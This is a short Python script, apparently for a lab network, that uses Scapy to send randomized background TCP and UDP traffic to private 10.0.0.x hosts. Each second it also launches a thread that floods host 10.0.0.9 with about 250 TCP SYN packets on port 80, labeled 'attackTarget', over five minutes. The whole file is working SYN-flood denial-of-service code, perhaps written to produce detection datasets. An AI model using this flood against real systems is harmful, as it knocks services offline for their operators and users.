from scapy.all import *
import time
import random
import threading

srcIp = "10.0.0.3"
normalTargets = ["10.0.0.%d" % i for i in range(1, 9) if i != 3]
attackTarget = "10.0.0.9"
duration = 300

def sendAttackPackets(rate):
    for _ in range(rate):
        sport = random.randint(1024, 65535)
        pkt = IP(src=srcIp, dst=attackTarget) / TCP(sport=sport, dport=80, flags="S")
        send(pkt, verbose=0)

for t in range(duration):
    startTime = time.time()
    count = 0

    targets = normalTargets.copy()
    random.shuffle(targets)
    normalRate = max(1, 50 + random.randint(-5, 5))

    while count < normalRate and time.time() - startTime < 1:
        dst = targets[count % len(targets)]
        sport = random.randint(1024, 65535)
        dport = random.choice([80, 443, 53])
        if random.random() < 0.5:
            pkt = IP(src=srcIp, dst=dst) / TCP(sport=sport, dport=dport, flags="S")
        else:
            pkt = IP(src=srcIp, dst=dst) / UDP(sport=sport, dport=dport)
        send(pkt, verbose=0)
        count += 1

    attackRate = max(10, 250 + random.randint(-15, 15))
    threading.Thread(target=sendAttackPackets, args=(attackRate,)).start()

    time.sleep(max(0, 1 - (time.time() - startTime)))

